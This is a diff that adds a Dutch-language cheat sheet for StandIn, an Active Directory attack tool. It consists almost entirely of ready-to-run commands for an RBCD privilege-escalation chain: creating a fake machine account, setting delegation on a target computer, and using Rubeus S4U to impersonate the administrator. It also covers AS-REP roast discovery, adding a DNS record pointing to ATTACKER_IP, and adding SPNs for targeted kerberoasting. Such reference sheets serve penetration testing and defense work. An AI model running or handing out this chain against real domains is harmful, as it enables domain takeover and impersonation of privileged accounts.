@@ -1,0 +1,53 @@
+# StandIn — AD object manipulatie & RBCD aanval tool
+# Maak machine accounts, stel RBCD in, en manipuleer AD objecten
+#
+# === Syntax ===
+# StandIn.exe <commando> [opties]
+#
+# === Commando's ===
+# --computer     Machine account operaties (aanmaken/verwijderen)
+# --object       AD object query en manipulatie
+# --delegation   Resource-Based Constrained Delegation setup
+# --gpo          GPO informatie ophalen
+# --dns          DNS record operaties
+# --spn          SPN manipulatie
+# --asrep        Vind AS-REP roastable accounts
+# --passnotreq   Vind accounts met PASSWD_NOTREQD
+#
+# === Belangrijkste opties ===
+# --make              Maak aan (bij --computer)
+# --delete            Verwijder
+# --sid SID           SID voor delegatie
+# --samaccountname    sAMAccountName filter
+# --domain DOMAIN     Doeldomein
+# --user USER         Gebruikersnaam
+# --pass PASS         Wachtwoord
+#
+# === RBCD aanvalsketen ===
+# 1. Maak machine account (als MachineAccountQuota > 0)
+# 2. Stel RBCD in op doel-computer
+# 3. S4U2self + S4U2proxy via Rubeus
+#
+# === Voorbeelden ===
+# -- Machine account aanmaken --
+StandIn.exe --computer FAKEPC --make
+StandIn.exe --computer FAKEPC --make --pass PASS
+# -- RBCD instellen (doel vertrouwt onze machine) --
+StandIn.exe --computer TARGET --delegation --sid S-1-5-21-...-FAKE_RID
+# -- RBCD verwijderen --
+StandIn.exe --computer TARGET --delegation --remove
+# -- Object opvragen --
+StandIn.exe --object --samaccountname USER
+StandIn.exe --object --samaccountname "Domain Admins" --domain DOMAIN
+# -- AS-REP roastable accounts --
+StandIn.exe --asrep
+# -- GPO informatie --
+StandIn.exe --gpo
+StandIn.exe --gpo --filter "Default Domain Policy"
+# -- DNS record toevoegen --
+StandIn.exe --dns --name HOST --ip ATTACKER_IP --add
+# -- SPN toevoegen (targeted kerberoast) --
+StandIn.exe --spn --samaccountname USER --principal cifs/fake --add
+# -- Vervolg RBCD: S4U aanval --
+# Rubeus.exe hash /password:PASS /user:FAKEPC$ /domain:DOMAIN
+# Rubeus.exe s4u /user:FAKEPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/TARGET /domain:DOMAIN /nowrap
